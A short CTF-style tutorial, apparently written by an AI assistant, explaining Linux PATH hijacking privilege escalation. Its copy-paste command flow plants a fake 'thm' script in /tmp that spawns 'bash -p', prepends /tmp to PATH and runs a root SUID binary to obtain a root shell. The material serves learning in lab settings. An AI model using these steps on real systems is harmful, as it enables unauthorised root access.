# 📝 PATH Hijacking Privilege Escalation 

This is the **EASIEST** explanation + steps you can use **every time** in any VM or CTF.

---

## ✅ 1. What is PATH hijacking 
* When Linux runs a command **without full path**, it looks in **$PATH** folders.
* If a **root SUID file** calls a command by name (example: `"thm"`), Linux searches folders in PATH.
* If **you** can put a fake `"thm"` file in a **writable folder** placed **before** system folders in PATH,
* The SUID program will run **your file** → **as ROOT**.

That’s all.

---

## ✅ 2. Requirements

* A SUID file owned by **root**
* A writable folder like `/tmp`
* The SUID program must call a command **without absolute path**

You already saw SUID file:

```
/home/murdoch/test
```

---

## ✅ 3. Find writable folder

```
find / -writable 2>/dev/null
```

You will almost always use:

```
/tmp
```

---

## ✅ 4. Make fake command (this will give root)

```
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/thm
chmod +x /tmp/thm
```

---

## ✅ 5. Add /tmp first in PATH

```
export PATH=/tmp:$PATH
echo $PATH
```

It MUST start with:

```
/tmp:
```

---

## ✅ 6. Run the SUID-root file

Example from your VM:

```
/home/murdoch/test
```

---

## ✅ 7. Check root

```
whoami
id
```

You will see:

```
root
```

---

# ⭐ FULL WORKING FLOW (copy–paste)

```
# 1. find writable dir
find / -writable 2>/dev/null

# 2. create fake command to get root
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/thm
chmod +x /tmp/thm

# 3. prepend /tmp to PATH
export PATH=/tmp:$PATH
echo $PATH

# 4. run SUID file
/home/murdoch/test

# 5. check root
whoami
id
```

---

# ⭐ SIMPLE LOGIC (your brain should remember this)

1️⃣ Find SUID
2️⃣ Check if it runs a command by name
3️⃣ Make fake command in /tmp
4️⃣ Put /tmp at start of PATH
5️⃣ Run SUID file → you become ROOT

---

If you want, I’ll also make a **simple SUID write-up**, **cron write-up**, **capabilities write-up**, **all in same simple style** for your full PrivEsc notes.
